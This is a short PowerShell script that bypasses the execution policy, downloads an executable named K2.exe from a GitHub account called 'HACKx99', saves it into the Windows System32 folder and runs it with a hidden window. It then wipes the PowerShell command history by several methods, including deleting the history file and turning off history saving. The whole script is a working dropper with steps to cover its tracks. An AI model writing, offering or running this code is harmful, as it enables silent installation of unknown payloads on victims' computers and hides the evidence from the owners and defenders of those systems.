# PowerShell Script to Download, Save to System32, Run EXE Silently, and Clear History
# WARNING: This script requires Administrator privileges to write to System32.

try {
    # Bypass execution policy
    Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Bypass -Force -ErrorAction SilentlyContinue

    # Use RAW GitHub URL for direct download
    $exeUrl = "https://github.com/HACKx99/WebSite/raw/main/K2.exe"
    $system32Path = "$env:windir\System32\K2.exe"
    $historyPath = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"

    Write-Output "Downloading EXE from GitHub..."
    
    # Download the EXE to System32
    Invoke-WebRequest -Uri $exeUrl -OutFile $system32Path -UseBasicParsing

    # Verify download
    if (Test-Path $system32Path) {
        Write-Output "EXE saved to System32 successfully"
        
        # Wait a moment to ensure file is completely written
        Start-Sleep -Seconds 2
        
        # Run EXE completely silently (no UI)
        Write-Output "Running EXE silently..."
        Start-Process -FilePath $system32Path -WindowStyle Hidden
        
        Write-Output "EXE is running in background (no visible UI)"
    } else {
        throw "Download failed - file not found at $system32Path"
    }

    # Forcefully clear PowerShell history
    Write-Output "Clearing PowerShell history..."
    
    # Method 1: Clear current session history
    Clear-History -ErrorAction SilentlyContinue
    
    # Method 2: Delete history file
    if (Test-Path $historyPath) {
        Remove-Item $historyPath -Force -ErrorAction SilentlyContinue
        Write-Output "History file removed forcefully"
    }
    
    # Method 3: Disable future history saving
    Set-PSReadLineOption -HistorySaveStyle SaveNothing -ErrorAction SilentlyContinue
    
    # Method 4: Clear command history from registry
    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\PowerShell\PSReadLine" -Name "ConsoleHostHistory" -ErrorAction SilentlyContinue
    
    Write-Output "PowerShell history cleared completely"

} catch {
    Write-Error "Error: $($_.Exception.Message)"
} finally {
    # Optional: Add exit if needed
    # exit 0
}
